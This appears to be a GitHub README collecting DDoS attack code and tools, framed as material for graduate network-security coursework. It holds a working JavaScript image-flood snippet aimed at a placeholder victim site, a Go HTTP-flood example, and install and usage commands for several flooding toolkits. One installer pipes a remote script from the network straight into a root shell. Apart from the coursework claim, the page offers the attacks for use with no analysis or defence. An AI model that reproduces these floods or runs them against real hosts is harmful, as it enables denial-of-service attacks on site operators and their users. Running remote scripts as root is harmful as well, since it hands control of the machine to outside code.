# DDoS
Snippets of code and resources related to DDoS attacks for graduate coursework on network security

 ![DDoS All The Things](/logo.jpg)

## Table of Contents

- [imgflood](#imgflood-Layer-7-flood-attack)
- [Raven-Storm Toolkit](#Raven-Storm-Toolkit)
- [ufonet](#ufonet)
- [DDoS Infinite HTTP GET](#DDoS-Infinite-HTTP-GET)
- [Golang-httpflood](#Golang-httpflood)
- [DDoS-Ripper](#DDoS-Ripper)
- [DDoS Scripts](#DDoS-Scripts)

## imgflood Layer 7 flood attack
- Link: [An introduction to JavaScript-based DDoS](https://blog.cloudflare.com/an-introduction-to-javascript-based-ddos/)

```
function imgflood() {
  var TARGET = 'victim-website.com'
  var URI = '/index.php?'
  var pic = new Image()
  var rand = Math.floor(Math.random() * 1000)
  pic.src = 'http://'+TARGET+URI+rand+'=val'
}
setInterval(imgflood, 10)
```

## Raven-Storm Toolkit
- Link: [Raven-Storm Toolkit GitHub](https://github.com/Taguar258/Raven-Storm)

```
curl -s https://raw.githubusercontent.com/Taguar258/Raven-Storm/master/install.sh | sudo bash -s
```

## ufonet
- Link: [ufonet GitHub](https://github.com/epsylon/ufonet)

You can automatically get all required libraries using (as root):
```
python3 setup.py install
```
For manual installation, on Debian-based systems (ex: Ubuntu), run:
```
sudo apt-get install python3-pycurl python3-geoip python3-whois python3-crypto python3-requests python3-scapy libgeoip1 libgeoip-dev
```
On other systems such as: Kali, Ubuntu, ArchLinux, ParrotSec, Fedora, etc... also run:
```
pip3 install GeoIP
pip3 install python-geoip
pip3 install pygeoip
pip3 install requests
pip3 install pycrypto
pip3 install pycurl
pip3 install whois
pip3 install scapy-python3
```

## DDoS Infinite HTTP GET
- Link: [DDoS HTTP GET GitHub](https://github.com/Konstantin8105/DDoS)

```
func main() {
	workers := 100
	d, err := ddos.New("http://127.0.0.1:80", workers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(time.Second)
	d.Stop()
	fmt.Println("DDoS attack server: http://127.0.0.1:80")
	// Output: DDoS attack server: http://127.0.0.1:80
}
```

## Golang-httpflood
- Link: [Golang-httpflood GitHub](https://github.com/Leeon123/golang-httpflood)

Install Golang
[Golang Download & Installation](https://go.dev/doc/install) 

Change Linux Resource Limit
```
ulimit -n 999999
```

Clone Repo
```
git clone https://github.com/Leeon123/golang-httpflood.git
```

Header.txt format
```
Accept: text/html
User-agent: Wget
Referer: http://google.com
```

Usage
```
cd golang-httpflood
go build httpflood.go
./httpflood  <url> <threads> <get/post> <seconds> <header.txt/nil>
```

## DDoS-Ripper
- Link: [DDoS-Ripper GitHub](https://github.com/palahsu/DDoS-Ripper)

```
sudo apt install git 
git clone https://github.com/palahsu/DDoS-Ripper.git 
cd DDoS-Ripper 
$ ls 
$ python3 DRipper.py OR python2 DRipper.py
```

## DDoS Scripts
- Link: [DDoS Scripts GitHub](https://github.com/PraneethKarnena/DDoS-Scripts)